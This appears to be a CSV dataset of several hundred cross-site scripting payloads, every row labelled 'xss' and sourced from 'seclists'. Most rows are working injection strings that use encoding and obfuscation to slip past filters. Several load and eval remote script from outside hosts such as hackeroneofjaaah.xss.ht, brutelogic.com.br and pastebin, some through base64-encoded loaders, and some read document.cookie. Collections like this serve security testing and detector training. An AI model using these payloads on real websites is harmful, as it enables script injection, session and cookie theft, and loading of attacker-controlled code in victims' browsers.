payload,label,source
"<script>'str1ng'.replace(/1/,alert)</script>     <script>'bbbalert(1)cccc'.replace(/a\w{4}\(\d\)/,eval)</script>     <script>'a1l2e3r4t6'.replace(/(.).(.).(.).(.).(.)/,function(match,$1,$2,$3,$4,$5) { this[$1+$2+$3+$4+$5](1); })</script>",xss,seclists
<script>eval('\\u'+'0061'+'lert(1)')</script>     <script>throw~delete~typeof~prompt(1)</script>     <script>delete[a=alert]/prompt a(1)</script>     <script>delete[a=this[atob('YWxlcnQ=')]]/prompt a(1)</script>     <script>(()=>{return this})().alert(1)</script>,xss,seclists
"<script>new function(){new.target.constructor('alert(1)')();}</script>     <script>Reflect.construct(function(){new.target.constructor('alert(1)')()},[])</script>",xss,seclists
"<link/rel=prefetch import href=data:q;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>",xss,seclists
"<link rel=""import"" href=""data:x,<script>alert(1)</script>     <script>Array.from1${alert}3${window}2</script>",xss,seclists
"<script>!{x(){alert(1)}}.x()</script>     <script>Array.from${eval}alert\1\``</script>     <script>Array.from([1],alert)</script>     <script>Promise.reject(""1"").then(null,alert)</script>",xss,seclists
"<svg </onload =""1> (_=alert,_(1)) """">",xss,seclists
"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",xss,seclists
"<p onbeforescriptexecute=""alert(1)""><svg><script>\</p>",xss,seclists
<img onerror=alert(1) src <u></u>     <videogt;<source onerror=javascript:prompt(911)gt;,xss,seclists
"<base target=""<script>alert(1)</script>""><a href=""javascript:name"">CLICK</a>",xss,seclists
"<base href=""javascript:/""><a href=""**/alert(1)""><base href=""javascript:/""><a href=""**/alert(1)"">",xss,seclists
<style>@KeyFrames x{</style><div style=animation-name:x onanimationstart=alert(1)> <,xss,seclists
${``[class extends[alert``]{}]},xss,seclists
</script>     <script>[class extends[alert``]{}]</script>,xss,seclists
<script>throw new class extends Function{}('alert(1)')``</script>     <script>x=new class extends Function{}('alert(1)'); x=new x;</script>     <script>new class extends alert(1){}</script>,xss,seclists
<script>new class extends class extends class extends class extends alert(1){}{}{}{}</script>,xss,seclists
"<script>new Image()[unescape('%6f%77%6e%65%72%44%6f%63%75%6d%65%6e%74')][atob('ZGVmYXVsdFZpZXc=')][8680439..toString(30)](1)</script>     <script src=data:,\u006fnerror=\u0061lert(1)></script>",xss,seclists
"""><svg><script/xlink:href=""data:,alert(1)     <svg><script/xlink:href=data:,alert(1)></script>     <frameset/onpageshow=alert(1)>",xss,seclists
<div onactivate=alert('Xss') id=xss style=overflow:scroll>,xss,seclists
<div onfocus=alert('xx') id=xss style=display:table>,xss,seclists
"""><script src=https://hackeroneofjaaah.xss.ht></script>",xss,seclists
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://hackeroneofjaaah.xss.ht\';document.body.appendChild(a)'),xss,seclists
"""><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGFja2Vyb25lb2ZqYWFhaC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>",xss,seclists
"""><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGFja2Vyb25lb2ZqYWFhaC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>",xss,seclists
"""><iframe srcdoc=""&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;hackeroneofjaaah.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"">",xss,seclists
"<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(""load"", b);a.open(""GET"", ""//hackeroneofjaaah.xss.ht"");a.send();</script>",xss,seclists
"<script>$.getScript(""//hackeroneofjaaah.xss.ht"")</script>",xss,seclists
><object+data=//14.rs>,xss,seclists
><script src=//pastebin.com/raw/WDWWYaLA></script>,xss,seclists
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>,xss,seclists
"<Img src = x onerror = ""javascript: window.onerror = alert; throw XSS"">",xss,seclists
"<Video> <source onerror = ""javascript: alert (XSS)"">",xss,seclists
"<Input value = ""XSS"" type = text>",xss,seclists
"<applet code=""javascript:confirm(document.cookie);"">",xss,seclists
"<isindex x=""javascript:"" onmouseover=""alert(XSS)"">",xss,seclists
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss,seclists
"""><img src=""x:x"" onerror=""alert(XSS)"">",xss,seclists
"""><iframe src=""javascript:alert(XSS)"">",xss,seclists
"<object data=""javascript:alert(XSS)"">",xss,seclists
<isindex type=image src=1 onerror=alert(XSS)>,xss,seclists
<img src=x:alert(alt) onerror=eval(src) alt=0>,xss,seclists
"<img  src=""x:gif"" onerror=""window['al\u0065rt'](0)""></img>",xss,seclists
"<iframe/src=""data:text/html,<svg onload=alert(1)>"">",xss,seclists
"<form><a href=""javascript:\u0061lert(1)"">X",xss,seclists
"</script><img/*%00/src=""worksinchrome&colon;prompt(1)""/%00*/onerror='eval(src)'>",xss,seclists
<style>//*{x:expression(alert(/xss/))}//<style></style>,xss,seclists
On Mouse Over​,xss,seclists
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe,xss,seclists
"<iframe srcdoc=""&lt;svg/onload=alert()&gt;"">",xss,seclists
"javascript:alert(""OfJAAH""):",xss,seclists
<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>,xss,seclists
<d3v/onauxclick=[2].some(confirm)>click,xss,seclists
<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>,xss,seclists
"{1==1}""><object+data=javascript%26colon%3b'str1ng'.replace('1',alert)>",xss,seclists
"'><img src=x onError=prompt(""OpenBugBounty"")>",xss,seclists
'><img+sRc=l+oNerrOr=prompt(document.cookie)+x>,xss,seclists
"""><object+data=javascript%26%63%6f%6c%6f%6e%3b'straccessng'.replace('access',alert)>",xss,seclists
<svg/ \/\/%20%20%20%20%20onload%20%20%20%20%20 =%20%20%20%20%20%20%20 window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>,xss,seclists
<svg/ subsoloprivxss \/\/%20%20%20%20%20onload%20%20%20%20%20 =%20%20%20%20%20%20%20 window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>,xss,seclists
<script>x = '<!--<script>'/*</script>-->*/;alert(1)</script,xss,seclists
"<svg onload=""import('data:text/javascript,al'+''+'ert(0)')"">",xss,seclists
<image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>,xss,seclists
"<details/open/ontoggle=""self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"">",xss,seclists
<</p>iframe src=javascript:alert()//,xss,seclists
<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click,xss,seclists
"<head></head><body>padding<bleh onclick=""top[/al/.source+/ert/.source]	``"">clickpadding</bleh></body>",xss,seclists
<details onauxclick=confirm`xss`></details>,xss,seclists
<svg onunload=http://window.open ('javascript:alert(1)')>,xss,seclists
<xss class=progress-bar-animated onanimationstart=alert(1)>,xss,seclists
<xss<script>>&28;prompt();&28;<</script>/xss>,xss,seclists
"<svg><b><style><img id=""&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;"">",xss,seclists
<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>,xss,seclists
<svg%0Aonauxclick=0;[1].some(confirm)//,xss,seclists
<</div>script</div>>alert()<</div>/script</div>>,xss,seclists
"""><svg onload=alert(1)>",xss,seclists
</tag><svg onload=alert(1)>,xss,seclists
"""></tag><svg onload=alert(1)>",xss,seclists
"""onmouseover=alert(1) //",xss,seclists
"""autofocus onfocus=alert(1) //",xss,seclists
"<img src=something onauxclick=""new Function `al\ert\`xss\``"">",xss,seclists
<svg id=javascript:alert(10) onload=location=id>,xss,seclists
"<img src=""img-src"" onloadstart=""alert(45)"">",xss,seclists
"<img src=""img-src"" onloadend=""alert(45)"">",xss,seclists
<img src onerror=%26emsp;prompt`${document.domain}`>,xss,seclists
'}alert(1);{',xss,seclists
'}alert(1)%0A{',xss,seclists
\'}alert(1);{//,xss,seclists
-alert(1)//\,xss,seclists
-alert(1)}//\,xss,seclists
${alert(1)},xss,seclists
p=<svg/1='&q='onload=alert(1)>,xss,seclists
p=<svg 1='&q='onload='/*&r=*/alert(1)'>,xss,seclists
q=<script/&q=/src=data:&q=alert(1)>,xss,seclists
"""><svg onload=alert(1)>.gif",xss,seclists
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(1)""/>",xss,seclists
<img src=1 onerror=alert(1)>,xss,seclists
<details open ontoggle=alert(1)>,xss,seclists
<svg><svg onload=alert(1)>,xss,seclists
"data:text/html,<img src=1 onerror=alert(1)>",xss,seclists
"data:text/html,<iframe src=javascript:alert(1)>",xss,seclists
><svg onload=alert(1)>?a=reader,xss,seclists
"<script src=data:,alert(1)>",xss,seclists
"<iframe src=TARGET_URL onload=""frames[0].postMessage('INJECTION','*')"">",xss,seclists
"<x:script xmlns:x=""http://www.w3.org/1999/xhtml"">alert(1)</x:script>",xss,seclists
"<x:script xmlns:x=""http://www.w3.org/1999/xhtml"" src=""//brutelogic.com.br/1.js""/>",xss,seclists
%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0A%0D%0A%3Cscript,xss,seclists
%3Ealert(1)%3C/script%3E,xss,seclists
%0D%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D,xss,seclists
%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E,xss,seclists
<p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y,xss,seclists
"<<!--%23set var=""x"" value=""svg onload=alert(1)""--><!--%23echo var=""x""-->>",xss,seclists
1<svg onload=alert(1)>,xss,seclists
"1""><svg onload=alert(1)>",xss,seclists
'1<svg onload=alert(1)>,xss,seclists
<svg onload=alert(1)>\,xss,seclists
<Svg OnLoad=alert(1)>,xss,seclists
<Script>alert(1)</Script>,xss,seclists
"<svg onload=""alert(1)""",xss,seclists
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>,xss,seclists
<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>,xss,seclists
<script/x>alert(1)</script>,xss,seclists
%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E,xss,seclists
%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E,xss,seclists
setTimeout`alert\x28document.domain\x29`,xss,seclists
setInterval`alert\x28document.domain\x29`,xss,seclists
<svg onload=alert&lpar;1&rpar;>,xss,seclists
<svg onload=alert&#40;1&#41>,xss,seclists
[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')(),xss,seclists
top.open`javas\cript:al\ert(1)`,xss,seclists
"""o<x>nmouseover=alert<x>(1)//",xss,seclists
"""autof<x>ocus o<x>nfocus=alert<x>(1)//",xss,seclists
<script src=https://www.google.com/complete/search?client=chrome%26jsonp=alert(1);></script>,xss,seclists
<x onauxclick=alert(1)>right click this!,xss,seclists
'-alert(1)-'<svg>,xss,seclists
\'-alert(1)//<svg>,xss,seclists
<svg/on<script><script>load=alert(1)//</script>,xss,seclists
<SCRİPT>alert(1)</SCRİPT>,xss,seclists
"<SCRİPT/SRC=data:,alert(1)>",xss,seclists
%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>,xss,seclists
<svg><set onbegin=alert(1)>,xss,seclists
<svg><set end=1 onend=alert(1)>,xss,seclists
%u003Csvg onload=alert(1)>,xss,seclists
%u3008svg onload=alert(2)>,xss,seclists
%uFF1Csvg onload=alert(3)>,xss,seclists
"""><svg/onload=alert(1)>""@x.y",xss,seclists
\74svg o\156load\75alert\501\51\76,xss,seclists
</script><svg><script>alert(1)//,xss,seclists
</script><script>'%0B'-alert(1)//,xss,seclists
"""`-alert(1)</script><script>`",xss,seclists
?p[<script>`]=`/alert(1)</script>,xss,seclists
';onerror=alert;throw 1//,xss,seclists
"""'>confirm&lpar;1)</Script><Svg><Script/1='",xss,seclists
%01Jav%09asc%09ript:https://DOMAIN/%250Acon%09firm%25%281%25%29,xss,seclists
<x onmouseenter=alert(1)>,xss,seclists
<x onafterscriptexecute=alert(1)>,xss,seclists
<x onbeforescriptexecute=alert(1)>,xss,seclists
<x onanimationend=alert(1)><style>x{animation:s}@keyframes s{},xss,seclists
<x onwebkitanimationend=alert(1)><style>x{animation:s}@keyframes s{},xss,seclists
"<svg><use xlink:href=data:image/svg%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>",xss,seclists
"</Script/""'--><Body /Autofocus /OnFocus = confirm`1` <!-->",xss,seclists
PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYCA8IS0tPg==,xss,seclists
<body onhashchange=alert(1)><a href=%23x>click this!#x,xss,seclists
<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br>,xss,seclists
<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>,xss,seclists
<br><x id=x>#x,xss,seclists
<body onhelp=alert(1)>press F1!,xss,seclists
<object onerror=alert(1)>,xss,seclists
"z"" onmouseover=""alert('Hackerone')"" style=""position:fixed;left:0;top:0;width:9999px;height:9999px;"">",xss,seclists
%3Csvg%2Fx%3D%22%3E%22%2F%3Cscript%3Ealert(%22xss%22)%3C%2Fscript%3E()%2F%2F,xss,seclists
%3Csvg/x=%22%3E%22/%3Cscript%3Ealert(document.cookie)%3C/script%3E()//,xss,seclists
'-confirm`1`-',xss,seclists
'-document.write`<h1>juniorEXPLOIT</h1>`-',xss,seclists
%22><svg%20onload=confirm(1);>,xss,seclists
'<'/'><'s't'y'l'e'/'o'n'l'o'a'd'='a'l'e'r't('1')'>,xss,seclists
<details open ontoggle=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>,xss,seclists
<svg onload=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='));>,xss,seclists
<marquee/onstart=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>,xss,seclists
"<svg onpointerenter=z=alert,z(document.domain)>",xss,seclists
<object data=javascript:window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>,xss,seclists
</TITLE><object/data=https://finickycold.htmlpasta.com>,xss,seclists
"""><h1><IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>123</h1>""",xss,seclists
<input type=text autofocus onfocus=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))//,xss,seclists
<script qwerty>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script qwerty>,xss,seclists
"<IMG SRC=""jav    ascript:javascript:alert(1);"">",xss,seclists
‘; alert(1);,xss,seclists
‘)alert(1);//,xss,seclists
<ScRiPt>alert(1)</sCriPt>,xss,seclists
<IMG SRC=jAVasCrIPt:alert(‘XSS’)>,xss,seclists
<IMG SRC=”javascript:alert(‘XSS’);”>,xss,seclists
<IMG SRC=javascript:alert(‘XSS’)>,xss,seclists
<img src=xss onerror=alert(1)>,xss,seclists
"<iframe style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",xss,seclists
"<div style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss,seclists
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",xss,seclists
"‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss,seclists
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>,xss,seclists
<IMG SRC=”jav ascript:alert(‘XSS’);”>,xss,seclists
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>,xss,seclists
<<SCRIPT>alert(“XSS”);//<</SCRIPT>,xss,seclists
%253cscript%253ealert(1)%253c/script%253e,xss,seclists
“><s”%2b”cript>alert(document.cookie)</script>,xss,seclists
foo<script>alert(1)</script>,xss,seclists
<scr<script>ipt>alert(1)</scr</script>ipt>,xss,seclists
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>,xss,seclists
<BODY ONLOAD=alert(‘XSS’)>,xss,seclists
<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>,xss,seclists
<IMG SRC=”javascript:alert(‘XSS’)”,xss,seclists
"javascript:alert(""hellox worldss"")",xss,seclists
"<img src=""javascript:alert('XSS');"">",xss,seclists
<img src=javascript:alert(&quot;XSS&quot;)>,xss,seclists
"<""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss,seclists
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search",xss,seclists
"<script>alert(""hellox worldss"")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510",xss,seclists
"<script>alert(""XSS"");</script>&search=1",xss,seclists
"0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//"";alert(String.fromCharCode?(88,83,83))//\"";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search",xss,seclists
<h1><font color=blue>hellox worldss</h1>,xss,seclists
<BODY ONLOAD=alert('hellox worldss')>,xss,seclists
<input onfocus=write(XSS) autofocus>,xss,seclists
<input onblur=write(XSS) autofocus><input autofocus>,xss,seclists
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,xss,seclists
"<form><button formaction=""javascript:alert(XSS)"">lol",xss,seclists
"<!--<img src=""--><img src=x onerror=alert(XSS)//"">",xss,seclists
"<![><img src=""]><img src=x onerror=alert(XSS)//"">",xss,seclists
"<style><img src=""</style><img src=x onerror=alert(XSS)//"">",xss,seclists
"<? foo=""><script>alert(1)</script>"">",xss,seclists
"<! foo=""><script>alert(1)</script>"">",xss,seclists
"</ foo=""><script>alert(1)</script>"">",xss,seclists
"<? foo=""><x foo='?><script>alert(1)</script>'>"">",xss,seclists
"<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(1)</script>"">",xss,seclists
"<% foo><x foo=""%><script>alert(123)</script>"">",xss,seclists
"<div style=""font-family:'foo&#10;;color:red;';"">LOL",xss,seclists
"LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>",xss,seclists
<script>({0:#0=alert/#0#/#0#(0)})</script>,xss,seclists
"<svg xmlns=""http://www.w3.org/2000/svg"">LOL<script>alert(123)</script></svg>",xss,seclists
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;,xss,seclists
"\\"";alert('XSS');//",xss,seclists
"&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\""XSS\"");&lt;/SCRIPT&gt;",xss,seclists
"&lt;INPUT TYPE=\""IMAGE\"" SRC=\""javascript&#058;alert('XSS');\""&gt;",xss,seclists
"&lt;BODY BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",xss,seclists
&lt;BODY ONLOAD=alert('XSS')&gt;,xss,seclists
"&lt;IMG DYNSRC=\""javascript&#058;alert('XSS')\""&gt;",xss,seclists
"&lt;IMG LOWSRC=\""javascript&#058;alert('XSS')\""&gt;",xss,seclists
"&lt;BGSOUND SRC=\""javascript&#058;alert('XSS');\""&gt;",xss,seclists
"&lt;BR SIZE=\""&{alert('XSS')}\""&gt;",xss,seclists
"&lt;LAYER SRC=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/LAYER&gt;",xss,seclists
"&lt;LINK REL=\""stylesheet\"" HREF=\""javascript&#058;alert('XSS');\""&gt;",xss,seclists
"&lt;LINK REL=\""stylesheet\"" HREF=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;css\""&gt;",xss,seclists
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;,xss,seclists
"&lt;META HTTP-EQUIV=\""Link\"" Content=\""&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\""&gt;",xss,seclists
"&lt;STYLE&gt;BODY{-moz-binding&#58;url(\""http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\"")}&lt;/STYLE&gt;",xss,seclists
"&lt;XSS STYLE=\""behavior&#58; url(xss&#46;htc);\""&gt;",xss,seclists
